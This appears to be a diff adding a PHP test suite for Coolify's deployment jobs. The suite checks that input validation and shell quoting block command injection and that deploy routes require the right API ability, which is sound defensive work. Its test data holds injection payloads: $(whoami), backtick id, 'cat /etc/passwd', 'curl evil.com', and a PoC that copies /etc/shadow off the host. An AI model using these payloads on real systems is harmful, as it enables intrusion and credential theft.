@@ -1,0 +1,1240 @@
+<?php
+
+use App\Actions\Service\DeployServiceApplication;
+use App\Actions\Service\StartService;
+use App\Jobs\ApplicationDeploymentJob;
+use App\Models\Application;
+use App\Models\ApplicationDeploymentQueue;
+use App\Models\ApplicationSetting;
+use App\Models\Environment;
+use App\Models\InstanceSettings;
+use App\Models\PrivateKey;
+use App\Models\Project;
+use App\Models\Server;
+use App\Models\ServerSetting;
+use App\Models\Service;
+use App\Models\StandaloneDocker;
+use App\Models\Team;
+use App\Rules\ValidGitBranch;
+use App\Support\RemoteProcessCommand;
+use App\Support\ValidationPatterns;
+use Illuminate\Foundation\Testing\LazilyRefreshDatabase;
+use Illuminate\Support\Collection;
+use Illuminate\Support\Facades\Bus;
+use Illuminate\Support\Facades\Process;
+
+uses(LazilyRefreshDatabase::class);
+
+describe('deployment job path field validation', function () {
+    test('rejects shell metacharacters in dockerfile_location', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/Dockerfile; echo pwned', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+
+    test('rejects backtick injection', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/Dockerfile`whoami`', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+
+    test('rejects dollar sign variable expansion', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/Dockerfile$(whoami)', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+
+    test('rejects pipe injection', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/Dockerfile | cat /etc/passwd', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+
+    test('rejects ampersand injection', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/Dockerfile && env', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+
+    test('rejects path traversal', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/../../../etc/passwd', 'dockerfile_location'))
+            ->toThrow(RuntimeException::class, 'path traversal detected');
+    });
+
+    test('allows valid simple path', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect($method->invoke($instance, '/Dockerfile', 'dockerfile_location'))
+            ->toBe('/Dockerfile');
+    });
+
+    test('allows valid nested path with dots and hyphens', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect($method->invoke($instance, '/docker/Dockerfile.prod', 'dockerfile_location'))
+            ->toBe('/docker/Dockerfile.prod');
+    });
+
+    test('allows path with @ symbol for scoped packages', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect($method->invoke($instance, '/packages/@intlayer/mcp/Dockerfile', 'dockerfile_location'))
+            ->toBe('/packages/@intlayer/mcp/Dockerfile');
+    });
+
+    test('allows path with tilde and plus characters', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect($method->invoke($instance, '/build~v1/c++/Dockerfile', 'dockerfile_location'))
+            ->toBe('/build~v1/c++/Dockerfile');
+    });
+
+    test('allows valid compose file path', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect($method->invoke($instance, '/docker-compose.prod.yml', 'docker_compose_location'))
+            ->toBe('/docker-compose.prod.yml');
+    });
+});
+
+describe('API validation rules for path fields', function () {
+    test('domains validation rejects command injection payloads', function (string $payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['domains' => $payload],
+            ['domains' => $rules['domains']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'host command substitution' => 'http://$(whoami).example.com',
+        'path command substitution' => 'http://example.com/$(whoami)',
+        'query command substitution' => 'http://example.com/path?next=$(id)',
+        'host backtick substitution' => 'http://`whoami`.example.com',
+        'path backtick substitution' => 'http://example.com/`whoami`',
+        'semicolon command separator' => 'http://example.com/path;id',
+        'newline injection' => "http://example.com\nwhoami",
+        'carriage return injection' => "http://example.com\rwhoami",
+        'pipe injection' => 'http://example.com/path|id',
+    ]);
+
+    test('domains validation rejects non http schemes', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['domains' => 'ftp://example.com'],
+            ['domains' => $rules['domains']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('domains validation allows comma separated http and https urls', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['domains' => 'https://app.example.com,http://api.example.com/path'],
+            ['domains' => $rules['domains']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('docker compose service domains validation rejects command injection payloads', function () {
+        $rules = [
+            'docker_compose_domains' => 'array|nullable',
+            'docker_compose_domains.*' => 'array:name,domain,redirect',
+            'docker_compose_domains.*.name' => 'string|required',
+            'docker_compose_domains.*.domain' => ValidationPatterns::applicationDomainRules(),
+            'docker_compose_domains.*.redirect' => 'nullable|string|in:www,non-www,both',
+        ];
+
+        $validator = validator(
+            [
+                'docker_compose_domains' => [
+                    ['name' => 'app', 'domain' => 'https://app.example.com/$(whoami)'],
+                ],
+            ],
+            $rules
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('git_branch validation rejects shell metacharacters', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'backtick command substitution' => 'main`id`',
+        'dollar command substitution' => 'main$(id)',
+        'semicolon command separator' => 'main;id',
+        'ifs shell expansion' => 'main${IFS}id',
+        'space separator' => 'main branch',
+    ]);
+
+    test('git_branch validation allows safe branch names', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'main',
+        'feature/safe-branch',
+        'release_2026.06',
+    ]);
+
+    test('dockerfile_location validation rejects shell metacharacters', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_location' => '/Dockerfile; echo pwned; #'],
+            ['dockerfile_location' => $rules['dockerfile_location']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('dockerfile_location validation allows valid paths', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_location' => '/docker/Dockerfile.prod'],
+            ['dockerfile_location' => $rules['dockerfile_location']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('docker_compose_location validation rejects shell metacharacters', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_location' => '/docker-compose.yml; env; #'],
+            ['docker_compose_location' => $rules['docker_compose_location']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('docker_compose_location validation allows valid paths', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_location' => '/docker/docker-compose.prod.yml'],
+            ['docker_compose_location' => $rules['docker_compose_location']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('dockerfile_location validation allows paths with @ for scoped packages', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_location' => '/packages/@intlayer/mcp/Dockerfile'],
+            ['dockerfile_location' => $rules['dockerfile_location']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+});
+
+describe('deployment git command escaping', function () {
+    test('ls-remote command shell-quotes repository and ref arguments', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        foreach ([
+            'application' => new Application,
+            'customPort' => 22,
+            'deployment_uuid' => 'deploy-uuid',
+            'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('gitLsRemoteCommand');
+        $method->setAccessible(true);
+
+        $command = $method->invoke($instance, 'refs/heads/main`id`', '/root/.ssh/id_rsa');
+
+        expect($command)
+            ->toContain("git ls-remote -- 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
+            ->toContain('-i /root/.ssh/id_rsa')
+            ->not->toContain('repo.git; curl');
+    });
+
+    test('coolify branch shell assignment is quoted', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        $application = new Application;
+        $application->uuid = 'app-uuid';
+        $application->git_branch = 'main`id`';
+        $application->fqdn = null;
+        $application->compose_parsing_version = '3';
+
+        $settings = new ApplicationSetting;
+        $settings->include_source_commit_in_build = false;
+        $application->setRelation('settings', $settings);
+
+        foreach ([
+            'application' => $application,
+            'commit' => 'HEAD',
+            'pull_request_id' => 0,
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('set_coolify_variables');
+        $method->setAccessible(true);
+        $method->invoke($instance);
+
+        $coolifyVariables = $job->getProperty('coolify_variables');
+        $coolifyVariables->setAccessible(true);
+
+        expect($coolifyVariables->getValue($instance))
+            ->toContain("COOLIFY_BRANCH='main`id`' ")
+            ->toContain("COOLIFY_RESOURCE_UUID='app-uuid' ");
+    });
+
+    test('coolify url and fqdn shell assignments are quoted', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        $application = new Application;
+        $application->uuid = 'app-uuid';
+        $application->git_branch = 'main';
+        $application->fqdn = 'https://app.example.com/path';
+        $application->compose_parsing_version = '3';
+
+        $settings = new ApplicationSetting;
+        $settings->include_source_commit_in_build = true;
+        $application->setRelation('settings', $settings);
+
+        foreach ([
+            'application' => $application,
+            'commit' => 'HEAD$(id)',
+            'pull_request_id' => 0,
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('set_coolify_variables');
+        $method->setAccessible(true);
+        $method->invoke($instance);
+
+        $coolifyVariables = $job->getProperty('coolify_variables');
+        $coolifyVariables->setAccessible(true);
+
+        expect($coolifyVariables->getValue($instance))
+            ->toContain("SOURCE_COMMIT='HEAD$(id)' ")
+            ->toContain("COOLIFY_URL='https://app.example.com/path' ")
+            ->toContain("COOLIFY_FQDN='app.example.com' ")
+            ->toContain("COOLIFY_RESOURCE_UUID='app-uuid' ");
+    });
+});
+
+describe('path fields require leading slash', function () {
+    test('dockerfile_location without leading slash is rejected by API rules', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_location' => 'Dockerfile'],
+            ['dockerfile_location' => $rules['dockerfile_location']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('docker_compose_location without leading slash is rejected by API rules', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_location' => 'docker-compose.yaml'],
+            ['docker_compose_location' => $rules['docker_compose_location']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('deployment job rejects path without leading slash', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, 'docker-compose.yaml', 'docker_compose_location'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+    });
+});
+
+describe('dockerfile_target_build validation', function () {
+    test('rejects shell metacharacters in dockerfile_target_build', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_target_build' => 'production; echo pwned'],
+            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects command substitution in dockerfile_target_build', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_target_build' => 'builder$(whoami)'],
+            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects ampersand injection in dockerfile_target_build', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_target_build' => 'stage && env'],
+            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid target names', function ($target) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['dockerfile_target_build' => $target],
+            ['dockerfile_target_build' => $rules['dockerfile_target_build']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with(['production', 'build-stage', 'stage.final', 'my_target', 'v2']);
+
+    test('runtime validates dockerfile_target_build', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+
+        // Test that validateShellSafeCommand is also available as a pattern
+        $pattern = ValidationPatterns::DOCKER_TARGET_PATTERN;
+        expect(preg_match($pattern, 'production'))->toBe(1);
+        expect(preg_match($pattern, 'build; env'))->toBe(0);
+        expect(preg_match($pattern, 'target`whoami`'))->toBe(0);
+    });
+});
+
+describe('base_directory validation', function () {
+    test('rejects shell metacharacters in base_directory', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['base_directory' => '/src; echo pwned'],
+            ['base_directory' => $rules['base_directory']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects command substitution in base_directory', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['base_directory' => '/dir$(whoami)'],
+            ['base_directory' => $rules['base_directory']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid base directories', function ($dir) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['base_directory' => $dir],
+            ['base_directory' => $rules['base_directory']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with(['/', '/src', '/backend/app', '/packages/@scope/app']);
+
+    test('runtime validates base_directory via validatePathField', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validatePathField');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, '/src; echo pwned', 'base_directory'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+
+        expect($method->invoke($instance, '/src', 'base_directory'))
+            ->toBe('/src');
+    });
+});
+
+describe('docker_compose_custom_command validation', function () {
+    test('rejects semicolon injection in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => 'docker compose up; echo pwned'],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects pipe injection in docker_compose_custom_build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_build_command' => 'docker compose build | curl evil.com'],
+            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows ampersand chaining in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => 'docker compose up && docker compose logs'],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('rejects command substitution in docker_compose_custom_build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_build_command' => 'docker compose build $(whoami)'],
+            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid docker compose commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => $cmd],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'docker compose build',
+        'docker compose up -d --build',
+        'docker compose -f custom.yml build --no-cache',
+        'docker compose build && docker tag registry.example.com/app:beta localhost:5000/app:beta && docker push localhost:5000/app:beta',
+    ]);
+
+    test('rejects backslash in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => 'docker compose up \\n curl evil.com'],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows single-quoted arguments in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => "docker compose up -d --build 'malicious'"],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('allows double quotes in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => 'docker compose up -d --build --build-arg VERSION="1.0.0"'],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    });
+
+    test('rejects newline injection in docker_compose_custom_start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => "docker compose up\ncurl evil.com"],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects carriage return injection in docker_compose_custom_build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['docker_compose_custom_build_command' => "docker compose build\rcurl evil.com"],
+            ['docker_compose_custom_build_command' => $rules['docker_compose_custom_build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('runtime validates docker compose commands', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validateShellSafeCommand');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, 'docker compose up; echo pwned', 'docker_compose_custom_start_command'))
+            ->toThrow(RuntimeException::class, 'contains forbidden shell characters');
+
+        expect(fn () => $method->invoke($instance, "docker compose up\ncurl evil.com", 'docker_compose_custom_start_command'))
+            ->toThrow(RuntimeException::class, 'contains forbidden shell characters');
+
+        expect($method->invoke($instance, 'docker compose up -d --build', 'docker_compose_custom_start_command'))
+            ->toBe('docker compose up -d --build');
+    });
+
+    test('rejects bare ampersand PoC payload (GHSA-chg4-63hm-xv9x)', function () {
+        $rules = sharedDataApplications();
+        $payload = 'true & docker run --rm -v /:/h alpine sh -c "cp /h/etc/shadow /h/tmp/leak"';
+
+        $validator = validator(
+            ['docker_compose_custom_start_command' => $payload],
+            ['docker_compose_custom_start_command' => $rules['docker_compose_custom_start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects bare ampersand across every shell-safe field', function ($field) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            [$field => 'cmd1 & cmd2'],
+            [$field => $rules[$field]]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'install_command',
+        'build_command',
+        'start_command',
+        'docker_compose_custom_build_command',
+        'docker_compose_custom_start_command',
+        'custom_docker_run_options',
+    ]);
+
+    test('rejects command substitution inside double quotes', function ($payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => "echo $payload"],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with(['"$(whoami)"', '"`whoami`"']);
+
+    test('rejects unbalanced quotes', function ($payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $payload],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with(['echo "unterminated', "echo 'unterminated"]);
+
+    test('rejects backslash anywhere', function ($payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $payload],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with(['echo \\;', 'echo \\$HOME']);
+
+    test('runtime validateShellSafeCommand rejects bare ampersand payload', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validateShellSafeCommand');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, 'true & whoami', 'docker_compose_custom_start_command'))
+            ->toThrow(RuntimeException::class, 'contains forbidden shell characters');
+    });
+
+    test('allows logical OR chaining', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $cmd],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'make build || make clean',
+        'npm run build || npm run fallback',
+        'cmd-a || cmd-b && cmd-c',
+    ]);
+
+    test('allows glob and bang tokens', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $cmd],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'rm *.tmp',
+        'cp src/?.js dist/',
+        '! grep -q foo && echo missing',
+        'docker build --tag app-v1!',
+    ]);
+
+    test('rejects bare pipe even though || is allowed', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $cmd],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'cmd | cat',
+        'cmd|cat',
+        'a |b',
+        'a| b',
+    ]);
+});
+
+describe('custom_docker_run_options validation', function () {
+    test('rejects semicolon injection in custom_docker_run_options', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['custom_docker_run_options' => '--cap-add=NET_ADMIN; echo pwned'],
+            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects command substitution in custom_docker_run_options', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['custom_docker_run_options' => '--hostname=$(whoami)'],
+            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid docker run options', function ($opts) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['custom_docker_run_options' => $opts],
+            ['custom_docker_run_options' => $rules['custom_docker_run_options']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        '--cap-add=NET_ADMIN --cap-add=NET_RAW',
+        '--privileged --init',
+        '--memory=512m --cpus=2',
+        '--entrypoint "sh -c \'npm start\'"',
+        '--entrypoint "sh -c \'php artisan schedule:work\'"',
+        '--hostname "my-host"',
+        '--dns 10.0.0.10 --dns=1.1.1.1',
+    ]);
+});
+
+describe('container name validation', function () {
+    test('rejects shell injection in container name', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['post_deployment_command_container' => 'my-container; echo pwned'],
+            ['post_deployment_command_container' => $rules['post_deployment_command_container']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid container names', function ($name) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['post_deployment_command_container' => $name],
+            ['post_deployment_command_container' => $rules['post_deployment_command_container']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with(['my-app', 'nginx_proxy', 'web.server', 'app123']);
+
+    test('runtime validates container names', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $method = $job->getMethod('validateContainerName');
+        $method->setAccessible(true);
+
+        $instance = $job->newInstanceWithoutConstructor();
+
+        expect(fn () => $method->invoke($instance, 'container; echo pwned'))
+            ->toThrow(RuntimeException::class, 'contains forbidden characters');
+
+        expect($method->invoke($instance, 'my-app'))
+            ->toBe('my-app');
+    });
+});
+
+describe('API route middleware for deploy actions', function () {
+    test('application start route requires deploy ability', function () {
+        $routes = app('router')->getRoutes();
+        $route = $routes->getByAction('App\Http\Controllers\Api\ApplicationsController@action_deploy');
+
+        expect($route)->not->toBeNull();
+        $middleware = $route->gatherMiddleware();
+        expect($middleware)->toContain('api.ability:deploy');
+        expect($middleware)->not->toContain('api.ability:write');
+    });
+
+    test('application restart route requires deploy ability', function () {
+        $routes = app('router')->getRoutes();
+        $matchedRoute = null;
+        foreach ($routes as $route) {
+            if (str_contains($route->uri(), 'applications') && str_contains($route->uri(), 'restart')) {
+                $matchedRoute = $route;
+                break;
+            }
+        }
+
+        expect($matchedRoute)->not->toBeNull();
+        $middleware = $matchedRoute->gatherMiddleware();
+        expect($middleware)->toContain('api.ability:deploy');
+    });
+
+    test('application stop route requires deploy ability', function () {
+        $routes = app('router')->getRoutes();
+        $matchedRoute = null;
+        foreach ($routes as $route) {
+            if (str_contains($route->uri(), 'applications') && str_contains($route->uri(), 'stop')) {
+                $matchedRoute = $route;
+                break;
+            }
+        }
+
+        expect($matchedRoute)->not->toBeNull();
+        $middleware = $matchedRoute->gatherMiddleware();
+        expect($middleware)->toContain('api.ability:deploy');
+    });
+
+    test('database start route requires deploy ability', function () {
+        $routes = app('router')->getRoutes();
+        $matchedRoute = null;
+        foreach ($routes as $route) {
+            if (str_contains($route->uri(), 'databases') && str_contains($route->uri(), 'start')) {
+                $matchedRoute = $route;
+                break;
+            }
+        }
+
+        expect($matchedRoute)->not->toBeNull();
+        $middleware = $matchedRoute->gatherMiddleware();
+        expect($middleware)->toContain('api.ability:deploy');
+    });
+
+    test('service start route requires deploy ability', function () {
+        $routes = app('router')->getRoutes();
+        $matchedRoute = null;
+        foreach ($routes as $route) {
+            if (str_contains($route->uri(), 'services') && str_contains($route->uri(), 'start')) {
+                $matchedRoute = $route;
+                break;
+            }
+        }
+
+        expect($matchedRoute)->not->toBeNull();
+        $middleware = $matchedRoute->gatherMiddleware();
+        expect($middleware)->toContain('api.ability:deploy');
+    });
+});
+
+describe('service application lifecycle command escaping', function () {
+    test('service application deploy action escapes docker command arguments', function () {
+        Server::flushIdentityMap();
+        Bus::fake();
+        Process::fake();
+        InstanceSettings::forceCreate(['id' => 0]);
+        config(['app.maintenance.store' => 'array', 'constants.ssh.mux_enabled' => false]);
+        $team = Team::factory()->create();
+        $server = Server::factory()->create([
+            'team_id' => $team->id,
+            'private_key_id' => PrivateKey::factory()->create(['team_id' => $team->id])->id,
+        ]);
+        $destination = StandaloneDocker::query()->where('server_id', $server->id)->firstOrFail();
+        $project = Project::factory()->create(['team_id' => $team->id]);
+        $service = Service::factory()->create([
+            'environment_id' => Environment::factory()->create(['project_id' => $project->id])->id,
+            'server_id' => $server->id,
+            'destination_id' => $destination->id,
+            'destination_type' => $destination->getMorphClass(),
+            'docker_compose_raw' => "services:\n  app:\n    image: busybox:latest\n",
+        ]);
+        $service->parse();
+        $serviceApplication = $service->applications()->firstOrFail();
+        $payload = "app'; touch /tmp/pwn; '";
+        $serviceApplication->name = $payload;
+
+        $script = RemoteProcessCommand::read(DeployServiceApplication::run($serviceApplication, pullLatestImages: true));
+
+        $compose = '--project-directory '.escapeshellarg($service->workdir()).' -f '.escapeshellarg($service->workdir().'/docker-compose.yml').' --project-name '.escapeshellarg($service->uuid);
+        expect($script)
+            ->toContain("docker compose {$compose} pull ".escapeshellarg($payload).' < /dev/null')
+            ->toContain("docker compose {$compose} up -d --no-deps ".escapeshellarg($payload).' < /dev/null')
+            ->not->toContain("pull {$payload}")
+            ->not->toContain("--no-deps {$payload}");
+    });
+
+    test('predefined network connect command escapes the container name', function () {
+        $service = (new Service)->forceFill(['uuid' => 'svc-uuid']);
+        $service->setRelation('destination', (new StandaloneDocker)->forceFill(['network' => 'coolify']));
+
+        expect(StartService::predefinedNetworkConnectCommand($service, 'app$(id)', []))
